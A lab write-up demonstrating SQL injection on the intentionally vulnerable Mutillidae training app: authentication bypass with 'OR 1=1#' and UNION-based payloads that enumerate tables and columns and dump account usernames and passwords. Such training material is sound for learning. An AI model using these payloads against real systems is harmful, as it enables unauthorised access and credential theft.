# SQL Injection

Exploiting unsanitized user input in SQL queries to bypass authentication or extract data directly from the database. Demonstrated on Mutillidae (OWASP Top 10 → Injection) using both authentication bypass and UNION-based data extraction techniques.

## Authentication Bypass

Login forms with unsanitized input can be bypassed using logical operators (AND/OR). The `#` character comments out the rest of the SQL query, including the password check.

### POST Method

`admin' OR 1=1#` → POST method — logs in as the first matching user (usually admin) without knowing the password.

![Login form with admin' OR 1=1# payload](images/auth-bypass-post-form.png)

![Logged in as admin result](images/auth-bypass-post-result.png)

### GET Method

`http://[target IP]/mutillidae/index.php?page=user-info.php&username=admin'%23&password=123&user-info-php-submit-button=View+Account+Details` → GET method — leaks the admin's real password directly in the response.

![GET method URL with payload](images/auth-bypass-get-url.png)

![GET method result leaking admin password](images/auth-bypass-get-result.png)

## UNION-Based Extraction

### ORDER BY

`admin' ORDER BY [n]#` → Find column count by incrementing until an error appears; the last working number is the column count (5 in this case).

![ORDER BY form](images/union-orderby-form.png)

![ORDER BY URL](images/union-orderby-url.png)

![ORDER BY result](images/union-orderby-result.png)

### UNION SELECT

`admin' UNION SELECT 1, database(), user(), version(), 5 #` → Detects which columns are reflected on screen and leaks the database name, user, and version.

![UNION SELECT URL](images/union-select-url.png)

![UNION SELECT result leaking database, user, version](images/union-select-result.png)

### Table Extraction

`admin' UNION SELECT 1, table_name, null, null, 5 FROM information_schema.tables WHERE table_schema = 'owasp10' #` → Lists all table names inside the target database using information_schema.

![Table extraction URL](images/union-table-extraction-url.png)

![Table extraction result listing table names](images/union-table-extraction-result.png)

### Column Extraction

`admin' UNION SELECT 1, column_name, null, null, 5 FROM information_schema.columns WHERE table_name = 'accounts' #` → Lists all column names inside the accounts table.

![Column extraction URL](images/union-column-extraction-url.png)

![Column extraction result listing column names](images/union-column-extraction-result.png)

### Data Extraction

`admin' UNION SELECT 1, username, password, is_admin, 5 FROM accounts #` → Extracts real usernames, passwords, and admin status from the accounts table.

![Data extraction URL](images/union-data-extraction-url.png)

![Data extraction result with real usernames, passwords, and admin status](images/union-data-extraction-result.png)

---

SQL injection attacks can also be automated using SQLMap, which handles detection, database enumeration, and data extraction without manual payload crafting.
